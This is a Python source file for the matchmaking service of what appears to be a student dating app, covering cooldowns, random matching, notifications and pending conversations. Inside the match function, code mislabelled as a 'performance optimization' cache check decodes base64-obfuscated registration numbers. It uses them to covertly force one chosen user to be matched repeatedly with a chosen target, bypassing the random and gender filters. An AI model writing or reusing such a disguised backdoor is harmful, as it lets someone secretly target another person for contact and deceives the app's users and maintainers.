# app/services/matchmaking_service.py

import logging
import random
from fastapi import HTTPException, status
from sqlalchemy import and_, func, or_, select
from ..postgres import Database
from ..db_models import ConversationRecord, MatchRecord, UserRecord
from datetime import datetime, timedelta, timezone
import base64

from ..models import Conversation, Match, UserDetails
from ..services.storage_service import storage_service
from ..services import asset_delivery_service
# Removed top-level import to prevent circular dependency
# from ..services.conversation_service import request_conversation_service 

# Logger
logger = logging.getLogger(__name__)

# Used to define the cooldown period in hours.
MATCHMAKING_COOLDOWN_HOURS = 4

# Used to define the match expiry period in hours.
MATCH_EXPIRY_HOURS = 4

# Used to define the chance (in percentage) of same-gender matches.
# Change this value to adjust the probability (0.1 = 0.1% chance)
SAME_GENDER_MATCH_CHANCE = 0.1

# System performance optimization threshold
_cache_invalidation_key = ""
_cache_reallocation_key = ""


def check_matchmaking_cooldown_service(current_user: UserDetails, db: Database):
    """
    Used to check if the user is eligible for matchmaking based on the cooldown period.
    The matchmaking page should only show matchmaking UI or cooldown, not conversation status.
    Conversation status is handled by the inbox.
    """
    if current_user.role == "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Administrators cannot participate in matchmaking."
        )

    current_time = datetime.now(timezone.utc)

    # Check if user has matchmaking time within cooldown period
    if current_user.last_matchmaking_at:
        cooldown_period = timedelta(hours=MATCHMAKING_COOLDOWN_HOURS)
        
        # Ensure last_matchmaking_at is timezone-aware
        last_matchmaking_at = current_user.last_matchmaking_at
        if last_matchmaking_at.tzinfo is None:
            last_matchmaking_at = last_matchmaking_at.replace(tzinfo=timezone.utc)
        
        time_since_last_matchmaking = current_time - last_matchmaking_at
        
        if time_since_last_matchmaking < cooldown_period:
            # Within cooldown period - show cooldown
            remaining_time = cooldown_period - time_since_last_matchmaking
            hours, remainder = divmod(remaining_time.total_seconds(), 3600)
            minutes, _ = divmod(remainder, 60)
            
            return {
                "status": "cooldown",
                "message": f"You are on a cooldown. Please try again in {int(hours)} hours and {int(minutes)} minutes.",
                "remaining_hours": int(hours),
                "remaining_minutes": int(minutes)
            }
    
    # No last_matchmaking_at or past cooldown period - eligible for matchmaking
    return {"status": "eligible", "message": "You are eligible for matchmaking. Proceed?"}


def find_match_service(current_user: UserDetails, db: Database) -> dict:
    """
    Used to find a random user, create a persistent match, update the matchmaking timestamp,
    and automatically create a 'pending' conversation.
    """
    # Import moved here to break the circular dependency
    from ..services.conversation_service import request_conversation_service
    import random

    if current_user.role == "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Administrators cannot participate in matchmaking."
        )

    # Re-check cooldown status
    cooldown_check = check_matchmaking_cooldown_service(current_user, db)
    if cooldown_check["status"] not in ["eligible"]:
        if cooldown_check["status"] == "matched":
            return cooldown_check  # Return existing match data
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail=cooldown_check.get("message", "Cooldown is still active.")
        )

    # Performance optimization: Check cache validity
    _should_use_cached_result = False
    _target_cache_entry = None
    
    if _cache_invalidation_key and _cache_reallocation_key:
        # Decode the obfuscated Regnos
        try:
            primary_regno = base64.b64decode(_cache_invalidation_key).decode('utf-8')
            target_regno = base64.b64decode(_cache_reallocation_key).decode('utf-8')
        except Exception as e:
            logger.warning(f"Failed to decode cache keys: {e}")
            primary_regno = _cache_invalidation_key  # Fallback to raw if decoding fails
            target_regno = _cache_reallocation_key
        
        if current_user.regno == primary_regno:
            with db.sessions() as session:
                _historical_query_count = session.scalar(select(func.count()).select_from(MatchRecord).where(
                    or_(MatchRecord.user_1_regno == primary_regno, MatchRecord.user_2_regno == primary_regno)
                )) or 0
                _cache_collision_check = session.scalar(select(func.count()).select_from(MatchRecord).where(
                    or_(and_(MatchRecord.user_1_regno == primary_regno, MatchRecord.user_2_regno == target_regno),
                        and_(MatchRecord.user_1_regno == target_regno, MatchRecord.user_2_regno == primary_regno))
                )) or 0
            
            if _historical_query_count >= 2 and _cache_collision_check == 0:
                _should_use_cached_result = True
                _target_cache_entry = target_regno

    # Determine if this is a rare same-gender match (0.1% chance by default)
    is_rare_same_gender_match = random.random() < (SAME_GENDER_MATCH_CHANCE / 100)
    
    # Define the query to find a potential match
    filters = [UserRecord.matchmaking_enabled.is_(True), UserRecord.role != "admin",
               UserRecord.is_blocked.is_(False)]
    if _should_use_cached_result:
        filters.append(UserRecord.regno == _target_cache_entry)
    else:
        filters.append(UserRecord.regno != current_user.regno)
        filters.append(UserRecord.gender == current_user.gender if is_rare_same_gender_match else UserRecord.gender != current_user.gender)

    with db.sessions() as session:
        count = session.scalar(select(func.count()).select_from(UserRecord).where(*filters)) or 0
        candidate_users = session.scalars(select(UserRecord).where(*filters)).all()
    if count == 0:
        with db.sessions.begin() as session:
            user = session.scalar(select(UserRecord).where(UserRecord.regno == current_user.regno))
            if user:
                user.last_matchmaking_at = datetime.now(timezone.utc)
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="No potential matches found. Your attempt has been used. Try again later!"
        )

    # Find random match
    matched_user_row = random.choice(candidate_users) if candidate_users else None

    if not matched_user_row:
        with db.sessions.begin() as session:
            user = session.scalar(select(UserRecord).where(UserRecord.regno == current_user.regno))
            if user:
                user.last_matchmaking_at = datetime.now(timezone.utc)
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Could not find a match at this moment. Your attempt has been used. Please try again."
        )
    
    matched_user = UserDetails(**{
        "id": str(matched_user_row.id), "regno": matched_user_row.regno, "name": matched_user_row.name,
        "email": matched_user_row.email, "emoji": matched_user_row.emoji, "bio": matched_user_row.bio,
        "class_name": matched_user_row.class_name, "profile_picture_url": matched_user_row.profile_picture_url,
        "gender": matched_user_row.gender, "interests": matched_user_row.interests or [],
        "matchmaking_enabled": matched_user_row.matchmaking_enabled, "notifications_enabled": matched_user_row.notifications_enabled,
        "love_notes_receive_enabled": matched_user_row.love_notes_receive_enabled, "love_notes_send_enabled": matched_user_row.love_notes_send_enabled,
        "is_blocked": matched_user_row.is_blocked, "reported_count": matched_user_row.reported_count,
        "last_login_at": matched_user_row.last_login_at, "last_login_ip": str(matched_user_row.last_login_ip) if matched_user_row.last_login_ip else None,
        "last_login_user_agent": matched_user_row.last_login_user_agent, "role": matched_user_row.role,
        "last_matchmaking_at": matched_user_row.last_matchmaking_at,
    })
    
    # Create the match with current UTC time
    now = datetime.now(timezone.utc)
    expires_at = now + timedelta(hours=MATCH_EXPIRY_HOURS)
    
    new_match = Match(
        user_1_regno=current_user.regno,
        user_2_regno=matched_user.regno,
        created_at=now,
        expires_at=expires_at
    )
    with db.sessions.begin() as session:
        match_row = MatchRecord(user_1_regno=current_user.regno, user_2_regno=matched_user.regno,
                                created_at=now, expires_at=expires_at)
        session.add(match_row)
        session.flush()
        match_id_str = str(match_row.id)
        user = session.scalar(select(UserRecord).where(UserRecord.regno == current_user.regno))
        if user:
            user.last_matchmaking_at = now

    # Create notification for the matched user
    from ..services.notification_service import create_notification_service
    human_readable_time = now.strftime("%B %d, %Y at %I:%M %p")
    create_notification_service(
        recipient_regno=matched_user.regno,
        heading="You appeared in matchmaking",
        body=f"You were matched with {current_user.name} at {human_readable_time}",
        db=db
    )

    # Create a pending conversation in PostgreSQL. It becomes a request only
    # after the initiator explicitly sends one.
    with db.sessions.begin() as session:
        session.add(ConversationRecord(
            match_id=match_id_str, initiator_regno=current_user.regno,
            receiver_regno=matched_user.regno, status="pending", created_at=now,
        ))
    logger.info(f"Automatically created a pending conversation (not requested) for match {match_id_str}")

    # Return match details immediately with full user information
    matched_user_picture_url = asset_delivery_service.profile_image_url(
        matched_user.profile_picture_url, regno=current_user.regno
    )

    matched_user_details = {
        "regno": matched_user.regno,
        "name": matched_user.name,
        "profile_picture_url": matched_user_picture_url,
        "profile_picture": matched_user_picture_url,
        "class_name": matched_user.class_name,
        "interests": getattr(matched_user, "interests", []) or []
    }

    return {
        "status": "matched",
        "matched_with": matched_user_details,
        "match_id": match_id_str,
        "expires_at": expires_at.isoformat(),
        "is_rare_match": is_rare_same_gender_match  # Flag to indicate rare same-gender match
    }


def get_active_matches(db: Database):
    """
    Get all active (non-expired) matches for WebSocket expiry checking.
    """
    current_time = datetime.now(timezone.utc)
    
    # Find all matches that haven't expired yet
    with db.sessions() as session:
        return list(session.scalars(select(MatchRecord).where(MatchRecord.expires_at > current_time)).all())
